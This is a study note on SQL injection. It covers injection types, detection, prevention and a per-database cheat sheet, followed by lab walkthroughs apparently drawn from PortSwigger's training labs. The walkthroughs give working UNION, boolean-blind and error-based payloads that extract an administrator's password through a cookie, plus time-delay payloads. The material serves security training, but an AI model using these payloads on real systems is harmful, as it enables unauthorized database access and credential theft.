## Types of sql injection
1. IN-Band(classic):use the same channel to attack and gain information.
    1. Error: force the database to generate an error.
    2. Union: to marge two sql query to give one result.
2. Inferential(Blind):There is no transfer of data.
    1. Boolean: use Boolean repsonce.
    2. Time: 
3. Out-of-Band: use different channel to attack and gain info. maybe use http request to insert the sql injection.
## Finding sqli Vulnerabilities
1. Black box:
    - Map the application.
    - Fuzz the application.
2. White box:
    - Enable web server logging
    - Enable database logging
    - Map the application
## Exploit of sql  injection
## Union-Based sqli
- there are two rules
1. the number and the order of the columns must be the same in all queries.
2. the data type must be compatible.
## Exploiting
-  determine the columns using "order by ":
- Determining the number of columns required in an sql injection Union attack using "NULL values".
## How to prevent sqli vulnerabilities
1. primary defenses:
    - use of prepared statements(parametrized queries)
    - use of stored procedures (partial)
    - whitelist input validation (partial)
    - escaping All user supplied input (partial)
2. Additional Defenses:
    - Also : enforcing least privilege
    - Also : performing whitelist input validation as a secondary defense.
- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve
## sql command
- to know the database version "select all from v$version".
- to list of table "Select * from information_schema.tables"
- for comment: "--" 
### Demo of sql injection
1. http request:https://insecure-website.com/products?category=Gifts'+OR+1=1--
2. change to sql: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
## Detect sql injection

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
## sql injection example
1. Retrieving hidden data
2. subverting application logic
3. union attacks 
4. blind sql injection :Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses.
5. First-order sql injection: when the http request is directly change in to sql query.
6. Second-order injection: it is when http request is store for the future use.
- After you identify a SQL injection vulnerability, it's often useful to obtain information about the database.

# ## String concatenation

You can concatenate together multiple strings to make a single string.

|            |                                                                                   |
| ---------- | --------------------------------------------------------------------------------- |
| Oracle     | `'foo'\|'bar'`                                                                    |
| Microsoft  | `'foo'+'bar'`                                                                     |
| PostgreSQL | `'foo'\|'bar'`                                                                    |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

## ## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|            |                                                                    |
| ---------- | ------------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |
#### Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

|            |                                                                                                                              |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`    |

# example

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.
## example of blind sql injection with bool

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, changing it to:
    
    `TrackingId=xyz' AND '1'='1`
    
    Verify that the `Welcome back` message appears in the response.
    
3. Now change it to:
    
    `TrackingId=xyz' AND '1'='2`
    
    Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
    
4. Now change it to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Verify that the condition is true, confirming that there is a table called `users`.
    
5. Now change it to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Verify that the condition is true, confirming that there is a user called `administrator`.
    
6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
7. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
    
    Then send:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
    
8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
9. In Burp Intruder, change the value of the cookie to:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression `Welcome back`. To do this, click on the **Settings** tab to open the **Settings** side panel. In the **Grep - Match** section, clear existing entries in the list, then add the value `Welcome back`.
13. Launch the attack by clicking the **Start attack** button.
14. Review the attack results to find the value of the character at the first position. You should see a column in the results called `Welcome back`. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
16. Launch the modified attack, review the results, and note the character at the second offset.
17. Continue this process testing offset 3, 4, and so on, until you have the whole password.
18. In the browser, click **My account** to open the login page. Use the password to log in as the `administrator` user.

#### Note

For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the cluster bomb attack type, and work through all permutations of offsets and character values.

## example of blind sql with error
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
2. Modify the `TrackingId` cookie, appending a single quotation mark to it:
    
    `TrackingId=xyz'`
    
    Verify that an error message is received.
    
3. Now change it to two quotation marks: `TrackingId=xyz''` Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
4. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
    
    `TrackingId=xyz'||(SELECT '')||'`
    
    In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
    
    `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
    
5. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
    
    `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
    
    This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
    
6. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the `users` table exists, send the following query:
    
    `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
    
7. You can also exploit this behavior to test conditions. First, submit the following query:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verify that an error message is received.
    
8. Now change it to:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.
    
9. You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.
    
10. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    This condition should be true, confirming that the password is greater than 1 character in length.
    
11. Send a series of follow-up values to test different password lengths. Send:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Then send:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
    
12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
13. Go to Burp Intruder and change the value of the cookie to:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    This uses the `SUBSTR()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
    
14. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
16. Launch the attack by clicking the " Start attack" button.
17. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
18. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
19. Launch the modified attack, review the results, and note the character at the second offset.
20. Continue this process testing offset 3, 4, and so on, until you have the whole password.
21. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.


## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|